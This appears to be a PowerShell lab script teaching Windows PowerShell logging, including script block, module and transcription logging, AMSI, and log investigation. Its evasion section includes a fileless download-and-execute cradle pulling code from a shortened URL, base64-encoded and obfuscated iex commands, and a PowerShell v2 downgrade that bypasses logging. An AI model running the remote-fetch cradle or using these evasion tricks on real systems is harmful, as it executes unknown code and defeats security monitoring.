break

# Lab 01 - Windows PowerShell Logging

## Objective

## Overview

## Exercise 1.1 - Stuff you get out-of-the-box with no configuration

### 1.1.1 PSReadline Command History

Get-Module

Get-Command -Module PSReadline

Get-PSReadlineOption

Get-Content (Get-PSReadlineOption).HistorySavePath

Select-String -Path (Get-PSReadlineOption).HistorySavePath -Pattern 'module'

Get-Item C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt

Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt -Pattern 'module'

Remove-Module PSReadline

### 1.1.2 Script Block Logging (Without Policy Implementation)

Add-Type -AssemblyName System.Speech

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

### 1.1.3 AntiMalware Scan Interface (AMSI)

Get-WinEvent -ListLog *defender*

Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -FilterXPath "*[System[((EventID=1116) or (EventID=1117))]]" -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

iex "AMSI Test Sample: $('{4}-{3}-{2}-{1}-{0}' -f '0ac1484c1386','8740','4339','861b','7e72c3ce')"

## Exercise 1.2 - PowerShell Policies

### 1.2.1 Module Logging / Pipeline Execution Logging

Get-WinEvent -ListLog *powershell*

Get-Module -ListAvailable | Format-Table Name, LogPipelineExecutionDetails

#region
    Import-Module NetAdapter
    $m = Get-Module NetAdapter
    $m.LogPipelineExecutionDetails = $true
#endregion

Get-WinEvent -LogName 'Windows PowerShell' -FilterXPath '*[System[(EventID=800)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

#region
    $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
    $ModulePath = $BasePath + '\ModuleNames'
    New-Item $ModulePath -Force
    New-ItemProperty $BasePath -Name EnableModuleLogging -Value 1 -PropertyType DWord
    New-ItemProperty $ModulePath -Name '*' -PropertyType String
#endregion

Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse

### 1.2.2 Script Block Logging

#region
    $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
    New-Item $BasePath -Force
    New-ItemProperty $BasePath -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord
#endregion

Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

### 1.2.3 System-Wide Transcription

#region
    $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription'
    New-Item $BasePath -Force
    New-ItemProperty $BasePath -Name EnableTranscripting -Value 1 -PropertyType DWord
    New-ItemProperty $BasePath -Name OutputDirectory -Value 'C:\PSTranscripts' -PropertyType String
    New-ItemProperty $BasePath -Name EnableInvocationHeader -Value 1 -PropertyType DWord
#endregion

Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse

Select-String -Path C:\PSTranscripts\*\* -Pattern mimikatz

## Exercise 1.3 - Evasion Techniques

### 1.3.1 Fileless Malware

iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")

### 1.3.2 Obfuscation

iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”

#region
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(@"
iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
"@
))
#endregion

powershell -enc aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g

Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt -Pattern 'Ovaltine'

Get-WinEvent -LogName 'Windows PowerShell' -FilterXPath '*[System[(EventID=800)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap

Select-String -Path C:\PSTranscripts\*\* -Pattern 'Ovaltine'

[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g"))

### 1.3.3 Version Downgrade

powershell.exe -version 2 -command "Can you see me now?"

Get-WindowsOptionalFeature -Online -FeatureName *V2*

Get-WindowsOptionalFeature -Online -FeatureName *V2* | ForEach-Object {Disable-WindowsOptionalFeature -Online -FeatureName $_.FeatureName -Verbose}

### 1.3.4 Version Upgrade

### 1.3.5 Cached Policy Disable

## Exercise 1.4 - Automating the Investigation

### 1.4.1 Enable Logging Enterprise-Wide

### 1.4.2 Increase Log Size

Get-WinEvent -ListLog *powershell*

wevtutil.exe set-log Microsoft-Windows-PowerShell/Operational /maxsize:$(1gb)

### 1.4.3 Purge Transcripts

#region
$basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
if(Test-Path $basePath) {
    $a = Get-ItemProperty $basePath -Name OutputDirectory | Select-Object -ExpandProperty OutputDirectory
    If (!$?) {'Not Configured'} Else {
        If (Test-Path -Path $a) {
            $RetentionDays = 14
            Get-ChildItem -Path $a -Recurse |
                Where-Object {$_.CreationTime -lt (Get-Date).AddDays(-1 * $RetentionDays)} |
                Remove-Item -Force -Confirm:$false -Recurse
        } Else {
            'Log path not found.'
        }
    }
} Else {
    'Not Configured'
}
#endregion

### 1.4.4 Collect Data From All Locations

### 1.4.5 Windows Event Forwarding

### 1.4.6 Logging Inception

